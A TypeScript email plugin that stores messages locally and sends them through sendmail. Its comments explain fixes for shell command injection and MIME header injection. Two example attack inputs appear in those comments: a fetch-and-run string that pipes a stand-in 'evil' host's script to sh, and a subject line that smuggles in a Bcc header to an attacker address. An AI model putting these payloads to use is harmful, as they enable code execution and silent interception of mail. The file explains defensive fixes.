import { execSync } from 'node:child_process';
import { existsSync, writeFileSync, mkdirSync, readFileSync, chmodSync } from 'node:fs';
import { homedir, hostname } from 'node:os';
import { join } from 'node:path';
import type { PluginDefinition } from "../plugin_manager/types.js";
import { BasePlugin } from "../plugin_manager/sdk.js";

export interface Email {
  id: string;
  from: string;
  to: string[];
  subject: string;
  body: string;
  timestamp: number;
  read: boolean;
  folder: "inbox" | "sent" | "drafts" | "trash";
}

const DATA_DIR = join(homedir(), '.neuroclaw', 'email');

export class EmailPlugin extends BasePlugin {
  private emails: Email[] = [];

  constructor(definition: PluginDefinition) {
    super(definition);
    try {
      if (!existsSync(DATA_DIR)) {
        mkdirSync(DATA_DIR, { recursive: true, mode: 0o700 });
      }
      if (process.platform !== "win32" && typeof chmodSync === "function") {
        chmodSync(DATA_DIR, 0o700);
        const storageFile = join(DATA_DIR, 'emails.json');
        if (existsSync(storageFile)) {
          chmodSync(storageFile, 0o600);
        }
      }
    } catch { }
    this.loadFromDisk();
  }

  async onActivate(context: any): Promise<void> {
    await super.onActivate(context);
    try {
      if (!existsSync(DATA_DIR)) {
        mkdirSync(DATA_DIR, { recursive: true, mode: 0o700 });
      }
      if (process.platform !== "win32" && typeof chmodSync === "function") {
        chmodSync(DATA_DIR, 0o700);
        const storageFile = join(DATA_DIR, 'emails.json');
        if (existsSync(storageFile)) {
          chmodSync(storageFile, 0o600);
        }
      }
    } catch { }
  }

  async send(from: string, to: string[], subject: string, body: string): Promise<Email> {
    const email: Email = {
      id: `email-${Date.now()}-${Math.random().toString(36).slice(2, 9)}`,
      from, to, subject, body, timestamp: Date.now(), read: true, folder: "sent",
    };

    const sent = this.trySendmail(email);
    this.emails.push(email);
    this.saveToDisk();

    if (!sent) {
      console.log(`[Email] Queued (no MTA): ${subject} to ${to.join(", ")}`);
    }

    return email;
  }

  async inbox(): Promise<Email[]> {
    return this.emails.filter(e => e.folder === "inbox").sort((a, b) => b.timestamp - a.timestamp);
  }

  async markRead(id: string): Promise<boolean> {
    const e = this.emails.find(em => em.id === id);
    if (!e) return false;
    e.read = true;
    this.saveToDisk();
    return true;
  }

  async search(query: string): Promise<Email[]> {
    const lower = query.toLowerCase();
    return this.emails.filter(e => e.subject.toLowerCase().includes(lower) || e.body.toLowerCase().includes(lower));
  }

  async listSent(): Promise<Email[]> {
    return this.emails.filter(e => e.folder === "sent").sort((a, b) => b.timestamp - a.timestamp);
  }

  async listAll(): Promise<Email[]> {
    return [...this.emails].sort((a, b) => b.timestamp - a.timestamp);
  }

  /**
   * Builds sendmail's invocation the safe way: the MIME content is handed to
   * the child process via stdin (execSync's `input` option), never
   * interpolated into the shell command string itself. The previous
   * implementation embedded email.from/to/subject/body directly into a
   * `echo "..." | sendmail ...` shell command with only `"` escaped --
   * backticks and $() are still interpreted by the shell inside double
   * quotes, so any of those fields containing e.g. `` `curl evil/x|sh` ``
   * was a real command injection, not just a theoretical one, the moment
   * anything called send() with attacker-influenced content. sendmailPath
   * itself is still safe to put in the command string: it only ever comes
   * from which() resolving one of a fixed set of literal binary names, never
   * user input.
   */
  private buildSendmailInvocation(mime: string, sendmailPath: string): { command: string; input: string } {
    return { command: `${sendmailPath} -t -i`, input: mime };
  }

  /**
   * Strip CR/LF from a value bound for a MIME header line. The MIME string
   * below is built by joining fields with \r\n, so a from/to/subject
   * containing an embedded \r\n breaks out of its own header line and
   * injects arbitrary extra header lines into the message -- e.g. a
   * subject of "Hello\r\nBcc: attacker@evil.com" appends a genuine Bcc:
   * header that sendmail honors, silently blind-copying every outgoing
   * message wherever the caller's subject/from/to content isn't fully
   * trusted. This is header injection, a different vulnerability class
   * from buildSendmailInvocation()'s already-fixed shell-command
   * injection (which passes the whole MIME body via stdin, not the shell
   * command string) -- stdin safety does nothing to stop the message
   * *content itself* from containing forged header lines.
   */
  private sanitizeHeaderValue(value: string): string {
    return value.replace(/[\r\n]+/g, ' ');
  }

  private trySendmail(email: Email): boolean {
    const sendmailPath = this.which('sendmail') || this.which('ssmtp') || this.which('msmtp');
    if (!sendmailPath) return false;

    try {
      const recipients = email.to.map(t => `<${this.sanitizeHeaderValue(t)}>`).join(', ');
      const mime = [
        `From: ${this.sanitizeHeaderValue(email.from)}`,
        `To: ${recipients}`,
        `Subject: ${this.sanitizeHeaderValue(email.subject)}`,
        `Date: ${new Date(email.timestamp).toUTCString()}`,
        'Content-Type: text/plain; charset=UTF-8',
        'Content-Transfer-Encoding: 8bit',
        '',
        email.body,
      ].join('\r\n');

      const { command, input } = this.buildSendmailInvocation(mime, sendmailPath);
      execSync(command, { timeout: 10000, input });
      return true;
    } catch {
      return false;
    }
  }

  private which(cmd: string): string | null {
    try {
      return execSync(`which ${cmd} 2>/dev/null`, { timeout: 2000, encoding: 'utf8' }).trim() || null;
    } catch { return null; }
  }

  private loadFromDisk(): void {
    try {
      const data = JSON.parse(readFileSync(join(DATA_DIR, 'emails.json'), 'utf-8'));
      this.emails = Array.isArray(data) ? data : [];
    } catch { this.emails = []; }
  }

  private saveToDisk(): void {
    try {
      if (!existsSync(DATA_DIR)) {
        mkdirSync(DATA_DIR, { recursive: true, mode: 0o700 });
      }
      if (process.platform !== "win32" && typeof chmodSync === "function") {
        chmodSync(DATA_DIR, 0o700);
      }
      const storageFile = join(DATA_DIR, 'emails.json');
      writeFileSync(storageFile, JSON.stringify(this.emails), {
        encoding: 'utf-8',
        mode: 0o600,
      });
      if (process.platform !== "win32" && typeof chmodSync === "function") {
        chmodSync(storageFile, 0o600);
      }
    } catch { /* non-fatal */ }
  }
}